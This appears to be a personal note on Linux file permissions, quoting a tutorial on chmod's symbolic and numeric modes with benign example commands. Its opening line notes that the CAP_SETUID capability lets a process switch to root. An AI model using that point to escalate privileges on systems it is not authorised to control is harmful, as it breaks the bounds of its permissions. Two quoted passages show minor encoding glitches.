CAP_SETUID allows the process to gain setuid privileges without the SUID bit set. This
effectively lets us switch to UID 0 i.e. root.

### discussion about the symbolic method

```
Symbolic method

The symbolic method uses the following syntax:

[tcarrigan@server ~]$ chmod WhoWhatWhich file | directory

Where:

    Who - represents identities: u,g,o,a (user, group, other, all)
    What - represents actions: +, -, = (add, remove, set exact)
    Which - represents access levels: r, w, x (read, write, execute)

An example of this is if I want to add the read and write permissions to a file named test.txt for user and group, I use the following command:

[tcarrigan@server ~]$ chmod ug+rw test.txt
```

```
umeric method

The numeric method is, in my experience, the best way to learn and practice permissions. It is based on the following syntax:

[tcarrigan@server ~]$ chmod ### file | directory

Here, from left to right, the character # represents an access level. There are three access levelsâ€”user, group, and others. To determine what each digit is, we use the following:

    Start at 0
    If the read permission should be set, add 4
    If the write permission should be set, add 2
    If the execute permission should be set, add 1

This is calculated on a per access level basis. Let's interpret this permissions example:

-rw-r-x---

The permissions are represented as 650. How did I arrive at those numbers?

    The user's permissions are: rw- or 4+2=6
    The group's permissions are: r-x or 4+1=5
    The others's permissions are: --- or 0

To put this into the command syntax, it looks like this:

[tcarrigan@server ~]$ chmod 650 test.txt
```
